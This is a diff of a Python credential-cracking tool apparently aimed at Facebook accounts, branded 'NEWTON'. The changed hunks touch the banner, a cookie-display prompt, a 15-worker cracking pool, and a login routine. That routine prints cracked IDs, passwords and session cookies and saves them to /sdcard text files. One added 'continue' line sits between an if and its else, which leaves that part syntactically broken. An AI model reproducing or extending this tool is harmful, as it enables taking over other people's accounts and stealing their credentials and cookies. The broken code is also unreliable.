@@ -268,9 +268,9 @@ def iAmMethod2Ua():
 name=input('\033[1;32m[✓] \033[1;32mINPUT NAME:')    
 logo=("""
 \033[1;37m   
-$$\   $$\ $$$$$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$\  $$\   $$|DEVELOPER:NEWTON
+$$\   $$\ $$$$$$$$\ $$\      $$\ $$$$$$$$\  $$$$$$\  $$\   $$\DEVELOPER:NEWTON
 $$$\  $$ |$$  _____|$$ | $\  $$ |\__$$  __|$$  __$$\ $$$\  $$ |FB: DI W AS
-$$$$\ $$ |$$ |      $$ |$$$\ $$ |   $$ |   $$ /  $$ |$$$$\ $$ |VERSION:2.0.3
+$$$$\ $$ |$$ |      $$ |$$$\ $$ |   $$ |   $$ /  $$ |$$$$\ $$ |VERSION:2.0.2
 $$ $$\$$ |$$$$$\    $$ $$ $$\$$ |   $$ |   $$ |  $$ |$$ $$\$$ |
 $$ \$$$$ |$$  __|   $$$$  _$$$$ |   $$ |   $$ |  $$ |$$ \$$$$ |
 $$ |\$$$ |$$ |      $$$  / \$$$ |   $$ |   $$ |  $$ |$$ |\$$$ |
@@ -422,12 +422,12 @@ def file():
                                 linex()
                                 print(' Do you want show cookies? (y/n): ')
                                 linex()
-                                print('\033[1;37m----------------------------------------------')
                                 DI=input(' Choose: ')
                                 if cx in ['y','Y','yes','Yes','1']:
                                         pcookie.append('y')
                                 else:
                                     pcookie.append('n')
+                                linex()
                                 with tred(max_workers=15) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
@@ -732,6 +732,7 @@ def M1(ids,names,passlist):
                                         print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
                                         if 'y' in pcookie:
                                         	print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
+                                        continue
                                         else:
                                         	continue
                                         open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
